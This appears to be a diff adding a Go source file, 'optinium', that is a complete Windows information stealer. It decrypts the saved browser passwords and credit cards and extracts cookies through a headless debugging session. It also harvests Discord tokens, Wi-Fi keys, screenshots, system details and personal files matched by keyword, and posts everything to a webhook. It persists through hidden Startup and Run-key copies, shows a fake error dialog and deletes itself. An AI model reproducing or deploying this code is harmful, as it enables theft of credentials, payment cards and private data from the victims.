@@ -1,0 +1,595 @@
+package optinium
+
+import (
+	"archive/zip"
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"database/sql"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"image/jpeg"
+	"io"
+	"mime/multipart"
+	"net/http"
+	"net/url"
+	"os"
+	"os/exec"
+	"os/user"
+	"path/filepath"
+	"regexp"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+
+	"github.com/kbinani/screenshot"
+	_ "github.com/mattn/go-sqlite3"
+	"github.com/shirou/gopsutil/cpu"
+	"github.com/shirou/gopsutil/host"
+	"github.com/shirou/gopsutil/mem"
+	"golang.org/x/net/websocket"
+	"golang.org/x/sys/windows/registry"
+)
+
+var (
+	WEBHOOK        string
+	IP             = getIP()
+	extractionName = fmt.Sprintf("%v@%v", os.Getenv("USERNAME"), IP)
+	SESSIONS       = [6]string{"Brave", "Chrome", "Edge", "Opera", "Opera GX", "Discord"}
+	APPDATA        = os.Getenv("APPDATA")
+	LOCAL          = os.Getenv("LOCALAPPDATA")
+
+	program   = os.Getenv("PROGRAMFILES")
+	program86 = os.Getenv("PROGRAMFILES(x86)")
+
+	EXE_PATHS = [5]string{
+		filepath.Join(program, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
+		filepath.Join(program, "Google", "Chrome", "Application", "chrome.exe"),
+		filepath.Join(program86, "Microsoft", "Edge", "Application", "msedge.exe"),
+		filepath.Join(LOCAL, "Programs", "Opera", "opera.exe"),
+		filepath.Join(LOCAL, "Programs", "Opera GX", "opera.exe"),
+	}
+
+	USER_PATHS = [5]string{
+		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+		filepath.Join(LOCAL, "Google", "Chrome", "User Data"),
+		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data"),
+		filepath.Join(APPDATA, "Opera Software", "Opera Stable"),
+		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable"),
+	}
+
+	LOCAL_PATHS = [5]string{
+		filepath.Join(USER_PATHS[0], "Local State"),
+		filepath.Join(USER_PATHS[1], "Local State"),
+		filepath.Join(USER_PATHS[2], "Local State"),
+		filepath.Join(USER_PATHS[3], "Local State"),
+		filepath.Join(USER_PATHS[4], "Local State"),
+	}
+
+	LOGIN_PATHS = [5]string{
+		filepath.Join(USER_PATHS[0], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[1], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[2], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[3], "Default", "Login Data"),
+		filepath.Join(USER_PATHS[4], "Login Data"),
+	}
+
+	WEB_PATHS = [5]string{
+		filepath.Join(USER_PATHS[0], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[1], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[2], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[3], "Default", "Web Data"),
+		filepath.Join(USER_PATHS[4], "Web Data"),
+	}
+
+	HISTORY_PATHS = [5]string{
+		filepath.Join(USER_PATHS[0], "Default", "History"),
+		filepath.Join(USER_PATHS[1], "Default", "History"),
+		filepath.Join(USER_PATHS[2], "Default", "History"),
+		filepath.Join(USER_PATHS[3], "Default", "History"),
+		filepath.Join(USER_PATHS[4], "History"),
+	}
+
+	TOKEN_PATHS = [6]string{
+		filepath.Join(USER_PATHS[0], "Default", "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[1], "Default", "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[2], "Default", "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[3], "Local Storage", "leveldb"),
+		filepath.Join(USER_PATHS[4], "Local Storage", "leveldb"),
+		filepath.Join(APPDATA, "discord", "Local Storage", "leveldb"),
+	}
+
+	regex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{38}`)
+
+	KEYS [][]byte
+
+	keywords = []string{
+		"pass", "cred", "auth", "log", "user", "name", "sign", "tok", "otp", "2fa", "mfa",
+		"ver", "sec", "unlock", "reset", "recov", "chall",
+		"id", "ssn", "soc", "card", "acc", "iban", "swift", "bic", "sort", "rout", "bank",
+		"tax", "vat", "pay", "bill", "inv", "sal", "stu", "earn",
+		"priv", "sec", "conf", "doc", "pers", "dat", "info", "prof", "rec", "rep",
+		"hist", "addr", "str", "city", "st", "post", "geo", "loc", "birth", "reg",
+		"med", "heal", "ins", "claim", "doc", "hosp", "pharm", "pres", "diag", "test",
+		"lic", "dl", "drv", "visa", "cit", "not", "cert",
+		"agr", "cont", "pol", "term", "nda", "fina",
+		"fing", "scan", "photo", "face", "self", "bio", "iris", "voice", "dna", "print",
+		"key", "pin", "puk", "hash", "dig", "sig", "wall", "crypt",
+		"empl", "job", "res", "cv", "hr", "work", "edu", "deg", "trans", "univ",
+		"mil", "gov", "clear", "top", "conf", "restr", "int", "class",
+		"bit", "eth", "fam", "bab", "db", "api", "@", "comp", "home", "main", "sour", "check",
+	}
+
+	dirs = []string{
+		"Desktop",
+		"Documents",
+		"Downloads",
+		"Favorites",
+		"Pictures",
+		"Videos",
+		"Music",
+		"OneDrive",
+		"Saved Games",
+		"Searches",
+		"Contacts",
+		"Links",
+		"AppData",
+	}
+
+	zipFile   *os.File
+	zipWriter *zip.Writer
+)
+
+type DataBlob struct {
+	Size uint32
+	Data *byte
+}
+
+func CryptUnprotectData(data []byte) []byte {
+	var inBlob = DataBlob{Size: uint32(len(data)), Data: &data[0]}
+	var outBlob DataBlob
+
+	crypt32 := syscall.NewLazyDLL("Crypt32.dll")
+	CryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
+
+	CryptUnprotectData.Call(uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
+
+	return unsafe.Slice(outBlob.Data, outBlob.Size)
+}
+
+func InitHook(webhook string) {
+	WEBHOOK = webhook
+}
+
+func InitKeys() {
+	for _, path := range LOCAL_PATHS {
+		KEYS = append(KEYS, extractKey(path))
+	}
+}
+
+func decryptData(data, key []byte) string {
+	aesBlock, _ := aes.NewCipher(key)
+	gcm, _ := cipher.NewGCM(aesBlock)
+
+	nonce := data[:gcm.NonceSize()]
+	ciphertext := data[gcm.NonceSize():]
+
+	data, _ = gcm.Open(nil, nonce, ciphertext, nil)
+	return string(data)
+}
+
+func extractKey(path string) []byte {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil
+	}
+	var result map[string]interface{}
+
+	json.Unmarshal(data, &result)
+
+	encodedKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
+	decodedKey, _ := base64.StdEncoding.DecodeString(encodedKey)
+
+	return CryptUnprotectData(decodedKey[5:])
+}
+
+func getIP() string {
+	resp, _ := http.Get("https://api.ipify.org?format=txt")
+	ip, _ := io.ReadAll(resp.Body)
+	return string(ip)
+}
+
+func queryDB(path, query string) *sql.Rows {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil
+	}
+	os.WriteFile("vault.db", data, 0644)
+
+	db, err := sql.Open("sqlite3", "vault.db")
+	if err != nil {
+		return nil
+	}
+	defer db.Close()
+
+	rows, err := db.Query(query)
+	if err != nil {
+		return nil
+	}
+
+	return rows
+}
+
+func SendData(data string) {
+	var buff bytes.Buffer
+
+	writer := multipart.NewWriter(&buff)
+	file, _ := writer.CreateFormFile("file", extractionName+".log")
+	file.Write([]byte(data))
+	writer.Close()
+
+	http.Post(WEBHOOK, writer.FormDataContentType(), &buff)
+}
+
+func startDebug(exe, user string) {
+	cmd := exec.Command("taskkill.exe", "/F", "/IM", filepath.Base(exe))
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Run()
+
+	start(exe, "--remote-debugging-port=9222", "--remote-allow-origins=*", "--headless", "--user-data-dir="+user)
+
+	time.Sleep(time.Second)
+}
+
+func getWsURL() string {
+	resp, _ := http.Get("http://localhost:9222/json")
+
+	var jsonData []map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&jsonData)
+
+	return jsonData[0]["webSocketDebuggerUrl"].(string)
+}
+
+type cookieResp struct {
+	Id     int    `json:"id"`
+	Result Result `json:"result"`
+}
+type Result struct {
+	Cookies []Cookie `json:"cookies"`
+}
+
+type Cookie struct {
+	Expires int    `json:"expires"`
+	Session bool   `json:"session"`
+	Secure  bool   `json:"secure"`
+	Name    string `json:"name"`
+	Domain  string `json:"domain"`
+	Value   string `json:"value"`
+}
+
+func CookieData() string {
+	var cookieData strings.Builder
+
+	for i, exe := range EXE_PATHS {
+		if _, err := os.Stat(exe); err == nil {
+			startDebug(exe, USER_PATHS[i])
+
+			ws, _ := websocket.Dial(getWsURL(), "", "http://localhost/")
+			defer ws.Close()
+
+			msg, _ := json.Marshal(map[string]interface{}{"id": 1, "method": "Network.getAllCookies"})
+			ws.Write(msg)
+
+			var resp []byte
+			websocket.Message.Receive(ws, &resp)
+			cmd := exec.Command("taskkill.exe", "/F", "/IM", filepath.Base(exe))
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd.Run()
+
+			var data cookieResp
+			json.Unmarshal(resp, &data)
+
+			for _, cookie := range data.Result.Cookies {
+				if time.Unix(int64(cookie.Expires), 0).After(time.Now()) {
+					cookieData.WriteString(fmt.Sprintf("==============================[COOKIE]==============================\nBrowser: %v\nDomain: %v\nSecure: %v\nSession: %v\nName: %v\nValue: %v\n\n", SESSIONS[i], cookie.Domain, cookie.Secure, cookie.Session, cookie.Name, cookie.Value))
+				}
+			}
+		}
+	}
+	return cookieData.String()
+}
+
+func SystemData() string {
+	currentUser, _ := user.Current()
+	memInfo, _ := mem.VirtualMemory()
+	cpuInfo, _ := cpu.Info()
+	hostInfo, _ := host.Info()
+
+	data := map[string]interface{}{
+		"User":   currentUser,
+		"Host":   hostInfo,
+		"CPU":    cpuInfo,
+		"Memory": memInfo,
+	}
+
+	rawData, _ := json.MarshalIndent(data, "", " ")
+
+	systemData := fmt.Sprintf("==============================[SYSTEM]==============================\n%v\n%v\n%v\n\n", string(rawData), run("systeminfo"), run("getmac"))
+
+	return systemData
+}
+
+func DiscordData() string {
+	var discordData strings.Builder
+	for index, path := range TOKEN_PATHS {
+		files, err := os.ReadDir(path)
+		if err == nil {
+			for _, file := range files {
+				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
+					data, _ := os.ReadFile(filepath.Join(path, file.Name()))
+					lines := strings.Split(string(data), "\n")
+					for _, line := range lines {
+						tokens := regex.FindAllString(line, -1)
+						for _, token := range tokens {
+							req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
+							req.Header.Set("Authorization", token)
+							resp, _ := http.DefaultClient.Do(req)
+							if resp.StatusCode == http.StatusOK {
+								var userData interface{}
+								json.NewDecoder(resp.Body).Decode(&userData)
+								prettyData, _ := json.MarshalIndent(userData, "", " ")
+								discordData.WriteString(fmt.Sprintf("==============================[DISCORD]==============================\nSession: %v\nToken: %v\n%v\n\n", SESSIONS[index], token, string(prettyData)))
+							}
+						}
+					}
+				}
+
+			}
+		}
+	}
+	return discordData.String()
+}
+
+func LoginData() string {
+	var loginData strings.Builder
+	defer os.Remove("vault.db")
+
+	for index, path := range LOGIN_PATHS {
+		rows := queryDB(path, "SELECT origin_url, username_value, password_value FROM logins;")
+		if rows == nil {
+			continue
+		}
+
+		for rows.Next() {
+			var url, username, password string
+			rows.Scan(&url, &username, &password)
+
+			if strings.HasPrefix(password, "v10") && len(KEYS[index]) > 0 {
+				password = decryptData([]byte(password[3:]), KEYS[index])
+				if password != "" {
+					loginData.WriteString(fmt.Sprintf("==============================[LOGIN]==============================\nBrowser: %v\nUrl: %v\nUsername: %v\nPassword: %v\n\n", SESSIONS[index], url, username, password))
+				}
+			}
+		}
+	}
+	return loginData.String()
+}
+
+func VisitedURLs() string {
+	var visited = map[string]int{}
+	var visitedURLs strings.Builder
+	defer os.Remove("vault.db")
+
+	for _, path := range HISTORY_PATHS {
+		rows := queryDB(path, "SELECT url, visit_count FROM urls;")
+		if rows == nil {
+			continue
+		}
+		for rows.Next() {
+			var urls string
+			var visits int
+
+			rows.Scan(&urls, &visits)
+			parsedURL, err := url.Parse(urls)
+			if err != nil {
+				continue
+			}
+			if parsedURL.Host != "" {
+				visited[parsedURL.Host] += visits
+			}
+		}
+	}
+	for urls, visits := range visited {
+		visitedURLs.WriteString(fmt.Sprintf("==============================[VISITED-URLs]==============================\nURL: %v\nVisits: %v\n\n", urls, visits))
+	}
+
+	return visitedURLs.String()
+}
+
+func IpData() string {
+	var ipData interface{}
+
+	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", IP))
+	json.NewDecoder(resp.Body).Decode(&ipData)
+	pretty, _ := json.MarshalIndent(ipData, "", " ")
+
+	return fmt.Sprintf("==============================[IP]==============================\n%v\n%v\n%v\n", string(pretty), run("ipconfig"), run("netstat -ano"))
+}
+
+func CardData() string {
+	var cardData strings.Builder
+	defer os.Remove("vault.db")
+
+	for index, path := range WEB_PATHS {
+		rows := queryDB(path, "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards;")
+		if rows == nil {
+			continue
+		}
+		for rows.Next() {
+			var name, number, expiration_m, expiration_y string
+			rows.Scan(&name, &number, &expiration_m, &expiration_y)
+
+			if strings.HasPrefix(number, "v10") && len(KEYS[index]) > 0 {
+				number = decryptData([]byte(number[3:]), KEYS[index])
+				if number != "" {
+					cardData.WriteString(fmt.Sprintf("==============================[CREDIT-CARD]==============================\nBrowser: %v\nCard_Owner: %s\nCard_Number: %s\nExpiration_Month: %v\nExpiration_Year: %v\n\n", SESSIONS[index], name, number, expiration_m, expiration_y))
+				}
+			}
+		}
+	}
+	return cardData.String()
+}
+
+func WifiData() string {
+	var wifiData strings.Builder
+	out := run("netsh wlan show profiles")
+	lines := strings.Split(out, "\n")
+
+	for _, line := range lines {
+		if strings.Contains(line, "All User Profile") {
+			profile := strings.TrimSpace(strings.Split(line, ":")[1])
+
+			out = run(fmt.Sprintf("netsh wlan show profile name=%v key=clear", profile))
+			lines := strings.Split(out, "\n")
+
+			for _, line := range lines {
+				if strings.Contains(line, "Key Content") {
+					parts := strings.Split(line, ":")
+					if len(parts) != 2 {
+						continue
+					}
+					key := strings.TrimSpace(parts[1])
+					wifiData.WriteString(fmt.Sprintf("==============================[WIFI]==============================\nProfile: %v\nKey: %s\n\n", profile, key))
+				}
+			}
+		}
+	}
+	return wifiData.String()
+}
+
+func Screenshot() {
+	var img bytes.Buffer
+	image, _ := screenshot.CaptureDisplay(0)
+	jpeg.Encode(&img, image, nil)
+
+	var buff bytes.Buffer
+
+	writer := multipart.NewWriter(&buff)
+	file, _ := writer.CreateFormFile("file", "screen.jpg")
+	file.Write(img.Bytes())
+	writer.Close()
+
+	http.Post(WEBHOOK, writer.FormDataContentType(), &buff)
+}
+
+func addToZip(path string) {
+	file, _ := os.Open(path)
+	defer file.Close()
+
+	writer, _ := zipWriter.Create(filepath.Base(path))
+	io.Copy(writer, file)
+}
+
+func in(item string, slice []string) bool {
+	for _, i := range slice {
+		if strings.Contains(strings.ToLower(item), strings.ToLower(i)) {
+			return true
+		}
+	}
+	return false
+}
+
+func enumDir(dir string) {
+	entries, _ := os.ReadDir(dir)
+
+	for _, entry := range entries {
+		file, _ := entry.Info()
+
+		if file.IsDir() {
+			enumDir(dir + file.Name() + "/")
+		} else if in(file.Name(), keywords) && file.Size() < 10000 && !file.IsDir() {
+			addToZip(dir + file.Name())
+		}
+	}
+}
+
+func StealFiles() {
+	var zipFile bytes.Buffer
+
+	zipWriter = zip.NewWriter(&zipFile)
+
+	USERDIR := os.Getenv("USERPROFILE")
+	os.Chdir(USERDIR)
+
+	entries, _ := os.ReadDir("./")
+
+	for _, entry := range entries {
+		file, _ := entry.Info()
+		if file.IsDir() && in(file.Name(), dirs) {
+			if file.Name() == "AppData" {
+
+			} else {
+				enumDir("./" + file.Name() + "/")
+			}
+		} else if in(file.Name(), keywords) && file.Size() < 20000 && !file.IsDir() {
+			addToZip("./" + file.Name())
+		}
+	}
+	zipWriter.Close()
+
+	var formBuffer bytes.Buffer
+	writer := multipart.NewWriter(&formBuffer)
+	file, _ := writer.CreateFormFile("file", extractionName+".zip")
+	file.Write(zipFile.Bytes())
+	writer.Close()
+
+	http.Post(WEBHOOK, writer.FormDataContentType(), &formBuffer)
+}
+
+func Persist() {
+	self, _ := os.Executable()
+	startUpPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "config.pif")
+	msPath := filepath.Join(os.Getenv("WINDIR"), "Tasks", "microsoft.com")
+
+	runRegistry := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+	myBytes, _ := os.ReadFile(self)
+	os.WriteFile(msPath, myBytes, 0644)
+	os.WriteFile(startUpPath, myBytes, 0644)
+
+	syscall.SetFileAttributes(syscall.StringToUTF16Ptr(msPath), syscall.FILE_ATTRIBUTE_HIDDEN)
+	syscall.SetFileAttributes(syscall.StringToUTF16Ptr(startUpPath), syscall.FILE_ATTRIBUTE_HIDDEN)
+
+	key, _ := registry.OpenKey(registry.CURRENT_USER, runRegistry, registry.ALL_ACCESS)
+	key.SetStringValue("UpdateServiceMirror ", msPath)
+	key.Close()
+}
+
+func FakeError() {
+	start("powershell.exe", "/c", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\"An error occurred while trying to run the application.\", \"Error 0x800204\", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)")
+
+}
+
+func start(name string, args ...string) {
+	cmd := exec.Command(name, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
+}
+
+func SelfDestruct() {
+	SELF, _ := os.Executable()
+	start("cmd.exe", "/c", fmt.Sprintf("del %v", SELF))
+}
+
+func Sleep() {
+	time.Sleep(20 * time.Second)
+}
+
+func run(command string) string {
+	cmd := exec.Command("powershell.exe", "-c", command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	out, _ := cmd.Output()
+	return string(out)
+}
